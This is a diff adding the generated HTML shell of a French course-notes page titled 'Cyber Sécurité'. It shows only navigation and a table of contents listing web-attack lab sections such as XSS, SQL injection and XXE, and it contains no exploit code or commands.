@@ -1,0 +1,2032 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-7.3.6">
+    
+    
+      
+        <title>Cyber Sécurité - Mes cours</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.a57b2b03.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.3f5d1f46.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="https://unpkg.com/mermaid@7.1.2/dist/mermaid.css">
+    
+    
+      
+
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+  
+    
+    <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cyber-securite" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Mes cours" class="md-header__button md-logo" aria-label="Mes cours" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Mes cours
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cyber Sécurité
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        
+<a href="https://github.com/louisonsarlinmagnus/cours-isen/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Edition
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Mes cours" class="md-nav__button md-logo" aria-label="Mes cours" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Mes cours
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/louisonsarlinmagnus/cours-isen/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Edition
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Accueil
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Tech
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Tech" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Tech
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Cyber Sécurité
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Cyber Sécurité
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#quand-mettre-en-place-de-la-securite" class="md-nav__link">
+    Quand mettre en place de la sécurité?
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#types-dattaque" class="md-nav__link">
+    Types d'attaque
+  </a>
+  
+    <nav class="md-nav" aria-label="Types d'attaque">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attaques-xss" class="md-nav__link">
+    Attaques XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaques-sql" class="md-nav__link">
+    Attaques SQL
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-xxe" class="md-nav__link">
+    Attaque XXE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-csrf" class="md-nav__link">
+    Attaque CSRF
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-par-deserialisation" class="md-nav__link">
+    Attaque par Déserialisation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-par-controle-dacces" class="md-nav__link">
+    Attaque par Contrôle d’accès
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#modes" class="md-nav__link">
+    Modes
+  </a>
+  
+    <nav class="md-nav" aria-label="Modes">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sniper" class="md-nav__link">
+    Sniper
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#battering-ram" class="md-nav__link">
+    Battering ram
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pitchfork" class="md-nav__link">
+    Pitchfork
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cluster-bomb" class="md-nav__link">
+    Cluster bomb
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tp" class="md-nav__link">
+    TP
+  </a>
+  
+    <nav class="md-nav" aria-label="TP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mise-en-place" class="md-nav__link">
+    Mise en place
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    SQL injection
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#numeric-sql-injection" class="md-nav__link">
+    Numeric SQL injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#string-sql-injection" class="md-nav__link">
+    String SQL injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automatisation" class="md-nav__link">
+    Automatisation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-sql-injection" class="md-nav__link">
+    Blind SQL Injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    XXE
+  </a>
+  
+    <nav class="md-nav" aria-label="XXE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attaque-en-direct" class="md-nav__link">
+    Attaque en direct
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-a-laide-dun-fichier" class="md-nav__link">
+    Attaque a l'aide d'un fichier
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mulillidae" class="md-nav__link">
+    Mulillidae
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#access-control-flaws" class="md-nav__link">
+    Access Control Flaws
+  </a>
+  
+    <nav class="md-nav" aria-label="Access Control Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#deserialization" class="md-nav__link">
+    Déserialization
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-a-path-based-access-control-scheme" class="md-nav__link">
+    Bypass a Path Based Access Control Scheme
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#role-based-access-control" class="md-nav__link">
+    Role Based Access Control
+  </a>
+  
+    <nav class="md-nav" aria-label="Role Based Access Control">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stage-1-bypass-business-layer-access-control" class="md-nav__link">
+    Stage 1: Bypass Business Layer Access Control
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stage-3-bypass-data-layer-access-control" class="md-nav__link">
+    Stage 3: Bypass Data Layer Access Control
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-management-flaws" class="md-nav__link">
+    Session Management Flaws
+  </a>
+  
+    <nav class="md-nav" aria-label="Session Management Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#spoof-an-authentication-cookie" class="md-nav__link">
+    Spoof an Authentication Cookie
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hijack-a-session" class="md-nav__link">
+    Hijack a Session
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authentication-flaws" class="md-nav__link">
+    Authentication Flaws
+  </a>
+  
+    <nav class="md-nav" aria-label="Authentication Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-token" class="md-nav__link">
+    JWT token
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT token">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signing" class="md-nav__link">
+    JWT signing
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csrf" class="md-nav__link">
+    CSRF
+  </a>
+  
+    <nav class="md-nav" aria-label="CSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#samurai-dojo-basic" class="md-nav__link">
+    Samurai-Dojo Basic
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    Tips
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../devOps/" class="md-nav__link">
+        Developpement Opérationnel
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ia/" class="md-nav__link">
+        Intelligence Artificielle
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linuxEmbarque/" class="md-nav__link">
+        Linux Embarqué
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../optoElectronique/" class="md-nav__link">
+        Opto-électronique
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reseauxElectriques/" class="md-nav__link">
+        Réseaux électriques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reseau/" class="md-nav__link">
+        Réseaux informatiques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../smartCard/" class="md-nav__link">
+        Smart-Card
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../os/" class="md-nav__link">
+        Système d'exploitation
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Sciences molles
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Sciences molles" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Sciences molles
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../molle/droitNum/" class="md-nav__link">
+        Droit du numérique
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../molle/qualite/" class="md-nav__link">
+        Gestion de la qualité
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../molle/marketing/" class="md-nav__link">
+        Marketing
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../molle/strategieInternationale/" class="md-nav__link">
+        Stratégie internationale
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Recherches
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Recherches" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Recherches
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../rech/reseauxElec/" class="md-nav__link">
+        Les réseaux électriques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../rech/transitionEnergetique/" class="md-nav__link">
+        Transition énergétique
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          CheatSheet
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CheatSheet" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          CheatSheet
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/resume/" class="md-nav__link">
+        Résumé
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/titres/" class="md-nav__link">
+        Titres
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/listes/" class="md-nav__link">
+        Listes
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/liens/" class="md-nav__link">
+        Liens
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/images/" class="md-nav__link">
+        Images
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/code/" class="md-nav__link">
+        Code
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/latex/" class="md-nav__link">
+        LaTex
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/tableaux/" class="md-nav__link">
+        Tableaux
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/diagrammes/" class="md-nav__link">
+        Diagrammes
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/tabs/" class="md-nav__link">
+        Tabs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/superfences/" class="md-nav__link">
+        SuperFences
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/citation/" class="md-nav__link">
+        Citation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/regles/" class="md-nav__link">
+        Règles
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/smileys/" class="md-nav__link">
+        Smileys
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/videos/" class="md-nav__link">
+        Vidéos
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheat/blocs/" class="md-nav__link">
+        Blocs d'alerte
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cheatSheet/" class="md-nav__link">
+        CheatSheet
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        A propos
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#quand-mettre-en-place-de-la-securite" class="md-nav__link">
+    Quand mettre en place de la sécurité?
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#types-dattaque" class="md-nav__link">
+    Types d'attaque
+  </a>
+  
+    <nav class="md-nav" aria-label="Types d'attaque">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attaques-xss" class="md-nav__link">
+    Attaques XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaques-sql" class="md-nav__link">
+    Attaques SQL
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-xxe" class="md-nav__link">
+    Attaque XXE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-csrf" class="md-nav__link">
+    Attaque CSRF
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-par-deserialisation" class="md-nav__link">
+    Attaque par Déserialisation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-par-controle-dacces" class="md-nav__link">
+    Attaque par Contrôle d’accès
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#modes" class="md-nav__link">
+    Modes
+  </a>
+  
+    <nav class="md-nav" aria-label="Modes">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sniper" class="md-nav__link">
+    Sniper
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#battering-ram" class="md-nav__link">
+    Battering ram
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pitchfork" class="md-nav__link">
+    Pitchfork
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cluster-bomb" class="md-nav__link">
+    Cluster bomb
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tp" class="md-nav__link">
+    TP
+  </a>
+  
+    <nav class="md-nav" aria-label="TP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mise-en-place" class="md-nav__link">
+    Mise en place
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    SQL injection
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#numeric-sql-injection" class="md-nav__link">
+    Numeric SQL injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#string-sql-injection" class="md-nav__link">
+    String SQL injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automatisation" class="md-nav__link">
+    Automatisation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-sql-injection" class="md-nav__link">
+    Blind SQL Injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    XXE
+  </a>
+  
+    <nav class="md-nav" aria-label="XXE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attaque-en-direct" class="md-nav__link">
+    Attaque en direct
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attaque-a-laide-dun-fichier" class="md-nav__link">
+    Attaque a l'aide d'un fichier
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mulillidae" class="md-nav__link">
+    Mulillidae
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#access-control-flaws" class="md-nav__link">
+    Access Control Flaws
+  </a>
+  
+    <nav class="md-nav" aria-label="Access Control Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#deserialization" class="md-nav__link">
+    Déserialization
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-a-path-based-access-control-scheme" class="md-nav__link">
+    Bypass a Path Based Access Control Scheme
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#role-based-access-control" class="md-nav__link">
+    Role Based Access Control
+  </a>
+  
+    <nav class="md-nav" aria-label="Role Based Access Control">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stage-1-bypass-business-layer-access-control" class="md-nav__link">
+    Stage 1: Bypass Business Layer Access Control
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stage-3-bypass-data-layer-access-control" class="md-nav__link">
+    Stage 3: Bypass Data Layer Access Control
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-management-flaws" class="md-nav__link">
+    Session Management Flaws
+  </a>
+  
